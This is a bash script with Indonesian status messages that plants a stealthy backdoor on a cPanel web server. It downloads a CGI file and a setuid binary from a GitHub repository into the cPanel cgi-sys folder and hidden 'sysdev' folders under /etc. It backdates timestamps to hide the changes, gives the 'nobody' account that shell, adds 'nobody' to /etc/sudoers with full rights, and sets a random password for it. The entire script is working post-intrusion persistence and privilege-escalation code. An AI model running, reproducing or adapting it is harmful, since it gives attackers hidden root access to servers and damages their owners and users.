#!/bin/bash

main="https://github.com/samsulazhr/myApp/raw/refs/heads/main/main3"
cgi="https://github.com/samsulazhr/myApp/raw/refs/heads/main/meme"

cpanelcgi="/usr/local/cpanel/cgi-sys/"

wheelorno=$(getent group wheel 2>/dev/null)
if [ -z "$wheelorno" ]; then
    wheelorno="root"
else
    wheelorno="wheel"
fi

lokasish=$(command -v sh 2>/dev/null || echo "/bin/sh")
randompass=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 12)

cd "$cpanelcgi"

statcgi=$(stat -c %Y "$cpanelcgi" 2>/dev/null || echo 0)

wget "$cgi" -O stemplate.cgi
chown root:$wheelorno stemplate.cgi
chmod 755 stemplate.cgi

touch -d "@$statcgi" stemplate.cgi
touch -d "@$statcgi" "$cpanelcgi"

if [ -f "stemplate.cgi" ]; then
    echo "[+] Sukses pasang file di $cpanelcgi/stemplate.cgi"
    suksescpanel=1
else
    echo "[-] Gagal pasang file di $cpanelcgi"
    suksescpanel=0
fi

arraydir=("/etc/default" "/etc/sysconfig" "/etc/fonts")
for dir in "${arraydir[@]}"; do
    if [ -d "$dir" ]; then
        cd "$dir"
        statdir=$(stat -c %Y . 2>/dev/null || echo 0)
        mkdir -p "sysdev"
        chmod 701 "sysdev"
        wget "$main" -O "sysdev/main"
        chmod 4755 "sysdev/main"
        touch -d "@$statdir" "sysdev/main"
        touch -d "@$statdir" "sysdev"
        touch -d "@$statdir" .
        if [ -d "sysdev" ]; then
            echo "[+] Sukses pasang file di $dir/sysdev/main"
            lokasish="$dir/sysdev/main"
            suksesdev=1
            break
        else
            echo "[-] Gagal pasang file di $dir"
            suksesdev=0
        fi
    else
        echo "[-] Direktori $dir tidak ditemukan, melewati..."
        suksesdev=0
    fi
done

usermoddulu=$(usermod -s "$lokasish" nobody 2>/dev/null)
if [ $? -eq 0 ]; then
    echo "[+] Sukses ubah shell user nobody ke $lokasish"
    suksesnobody=1
else
    echo "[-] Gagal ubah shell user nobody"
    suksesnobody=0
fi

ceksudo=$(type sudo 2>/dev/null)
if [ -n "$ceksudo" ]; then
    echo "[+] Sudo ditemukan, menambahkan user nobody ke sudoers dengan password $randompass"
    echo "nobody ALL=(ALL) ALL" >> /etc/sudoers
    echo "nobody:$randompass" | chpasswd
    suksessudo=1
else
    echo "[-] Sudo tidak ditemukan, melewati penambahan user nobody ke sudoers"
    suksessudo=0
fi

echo "== Ringkasan =="
if [ $suksescpanel -eq 1 ]; then
    echo "  - File stemplate.cgi berhasil dipasang di $cpanelcgi"
else
    echo "  - Gagal memasang file stemplate.cgi di $cpanelcgi"
fi

if [ $suksesdev -eq 1 ]; then
    echo "  - File main berhasil dipasang di direktori $lokasish"
else
    echo "  - Gagal memasang file main di direktori sysdev dalam semua direktori ${arraydir[*]}"
fi 

if [ $suksesnobody -eq 1 ]; then
    echo "  - Shell user nobody berhasil diubah ke $lokasish"
    echo "  - Sandi user nobody diubah ke $randompass"
else
    echo "  - Gagal mengubah shell user nobody"
fi

echo "  - Sudo $ceksudo, user nobody $suksessudo"
echo "== Selesai =="
